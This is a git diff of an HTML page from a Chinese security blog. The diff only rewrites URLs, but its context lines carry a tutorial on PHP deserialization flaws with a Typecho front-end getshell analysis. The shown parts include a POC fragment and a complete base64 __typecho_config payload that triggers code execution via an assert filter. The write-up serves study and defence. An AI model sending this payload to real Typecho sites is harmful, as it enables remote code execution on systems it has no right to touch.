@@ -4,10 +4,10 @@
   <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>PHP 反序列化漏洞利用与学习 | 3ND</title>
-<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627821697412">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="PHP 反序列化漏洞利用与学习 | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PHP 反序列化漏洞利用与学习 | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -27,8 +27,8 @@ PHP中的反序列化函..." />
   <div class="main">
     <div class="main-content">
       <div class="site-header">
-  <a href="https://github.com/inspiringz/inspiringz.github.io">
-  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  <a href="https://3nd.xyz">
+  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627821697412" alt="">
   </a>
   <h1 class="site-title">
     3ND
@@ -97,11 +97,11 @@ PHP中的反序列化函..." />
               <span class="page-view" key="20190901155805" title="PHP 反序列化漏洞利用与学习">
               </span>
               
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/summary/" class="post-tag">
+                <a href="https://3nd.xyz/tag/summary/" class="post-tag">
                   # Summary
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/php/" class="post-tag">
+                <a href="https://3nd.xyz/tag/php/" class="post-tag">
                   # PHP
                 </a>
                 
@@ -112,7 +112,7 @@ PHP中的反序列化函..." />
                     <h2 id="php反序列化基础">PHP反序列化基础</h2>
 <h3 id="序列化与反序列化">序列化与反序列化</h3>
 <p><strong>序列化</strong>是一种将对象状态转换为字节流的机制。<strong>反序列化</strong>是一个相反的过程，其中字节流用于重新创建内存中的实际对象。此机制用于<strong>持久化</strong>对象，便于数据(对象)的存储和(在网络节点中的)传输。</p>
-<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-01-16-47-19.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/2019-09-01-16-47-19.png" alt="" loading="lazy"></figure>
 <h3 id="php中的反序列化函数">PHP中的反序列化函数</h3>
 <p>序列化对象 - 在会话中存放对象，PHP提供了以下两个函数用于序列化与反序列化:</p>
 <pre><code class="language-php">serialize()    //Object → String
@@ -210,7 +210,7 @@ __invoke() //当脚本尝试将对象调用为函数时触发
 <h3 id="反序列化漏洞">反序列化漏洞</h3>
 <p>序列化给我们传递对象提供了一种简单的方法。反序列化的数据本质上来说是没有危害的，用户可控数据进行反序列化是存在危害的，反序列化的危害，关键还是在于<strong>可控或不可控</strong>。</p>
 <p>不安全的反序列化通常会导致<strong>远程代码执行</strong>。即使反序列化漏洞不会导致远程代码执行，它们也可用于执行攻击，包括<strong>重放攻击</strong>，<strong>注入攻击</strong>和<strong>权限提升攻击</strong>。</p>
-<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-02-00-06-06.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/2019-09-02-00-06-06.png" alt="" loading="lazy"></figure>
 <p>如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱。</p>
 <p>这可能导致两种主要类型的攻击：</p>
 <ul>
@@ -249,7 +249,7 @@ __invoke() //当脚本尝试将对象调用为函数时触发
 <p>通俗点就是：<strong>反序列化中，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</strong></p>
 <h2 id="漏洞实例分析">漏洞实例分析</h2>
 <h3 id="typecho前台getshell">Typecho前台GETShell</h3>
-<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-02-00-15-29.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/2019-09-02-00-15-29.png" alt="" loading="lazy"></figure>
 <p>首先进入<code>index.php</code> line 58-76 处观察到漏洞复现的前置判断条件代码：</p>
 <pre><code class="language-php">//判断是否已经安装
 if (!isset($_GET['finish']) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') &amp;&amp; empty($_SESSION['typecho'])) {
@@ -283,21 +283,21 @@ Typecho_Db::set($db);
 ?&gt;
 </code></pre>
 <p>这里进入<code>/var/Typecho/Cookie.php</code>，定位到<strong>Typecho_Cookie::get()</strong>:</p>
-<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-02-00-27-12.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/2019-09-02-00-27-12.png" alt="" loading="lazy"></figure>
 <p>可以发现<code>__typecho_config</code>参数可控，可以通过POST方法赋值。</p>
 <pre><code class="language-php">__typecho_config -&gt; $config -&gt; new Typecho_Db($config['adapter'], $config['prefix'])
 </code></pre>
 <p>跟进到<strong>Typecho_Db</strong>类，挖掘相关魔术方法:</p>
-<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-02-00-34-06.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/2019-09-02-00-34-06.png" alt="" loading="lazy"></figure>
 <p>adapterName对应config里面的config里面的adapter，如果我们用adapter来实例化一个类，PHP是一个弱类型的语言，当把一个字符串和一个类进行拼接的时候，会把类转换成字符串，这个时候就会触发<code>__toString()</code>函数。</p>
 <p>在<strong>Typecho_Feed</strong>类中挖掘到**__toString()**魔术方法:</p>
-<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-02-00-36-27.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/2019-09-02-00-36-27.png" alt="" loading="lazy"></figure>
 <p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">自</mi></mrow><annotation encoding="application/x-tex">item取自</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">自</span></span></span></span>this-&gt;_items，$this-&gt;_items为类Typecho_Feed中的一个Private属性。</p>
 <p>在这里如果可以将<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \[ at position 5: item\̲[̲&#039;author&#039;\]定义为一个…'>item\[&#039;author&#039;\]定义为一个类，则在执行</span>item['author']-&gt;screenName时则会自动调用<code>__get()</code>.</p>
 <p>在<strong>Typecho_Request</strong>类中挖掘到**__get()**魔术方法:</p>
-<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-02-00-40-17.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/2019-09-02-00-40-17.png" alt="" loading="lazy"></figure>
 <p>跟进进入**_applyFilter()**函数：</p>
-<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-02-00-42-12.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/2019-09-02-00-42-12.png" alt="" loading="lazy"></figure>
 <pre><code class="language-php">array_map() 为数组的每一个元素应用回调函数 eg: array_map(‘phpinfo’, array(1,2,3)); 
 call_user_func() 把第一个参数作为回调参数调用，其余参数是回调函数的参数 eg: call_user_func(‘phpinfo’,1);
 </code></pre>
@@ -313,7 +313,7 @@ call_user_func() / array_map()
 <ul>
 <li>POC</li>
 </ul>
-<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-02-00-47-23.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/2019-09-02-00-47-23.png" alt="" loading="lazy"></figure>
 <pre><code class="language-php">&lt;?php
 class Typecho_Request
 {
@@ -352,7 +352,7 @@ echo base64_encode(serialize($exp));
 </ul>
 <pre><code class="language-php">__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToyOntzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=
 </code></pre>
-<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-02-00-52-28.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/2019-09-02-00-52-28.png" alt="" loading="lazy"></figure>
 <h2 id="一些绕过技巧">一些绕过技巧</h2>
 <ul>
 <li><code>__wakeup()</code>绕过</li>
@@ -443,7 +443,7 @@ echo base64_encode(serialize($exp));
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter;text-align: left;">上一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-09-02-ssti-learning-note/">
+              <a href="https://3nd.xyz/post/2019-09-02-ssti-learning-note/">
                 <h3 class="post-title" style="text-align: left;">
                   服务端模板注入攻击(SSTI)学习
                 </h3>
@@ -454,7 +454,7 @@ echo base64_encode(serialize($exp));
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter; text-align: right;">下一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-08-31-xxe-learning-note/">
+              <a href="https://3nd.xyz/post/2019-08-31-xxe-learning-note/">
                 <h3 class="post-title" style="
                 text-align: right;">
                   XML外部实体注入漏洞与利用学习
@@ -468,7 +468,7 @@ echo base64_encode(serialize($exp));
 
                                 <div class="site-footer">
   
-  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
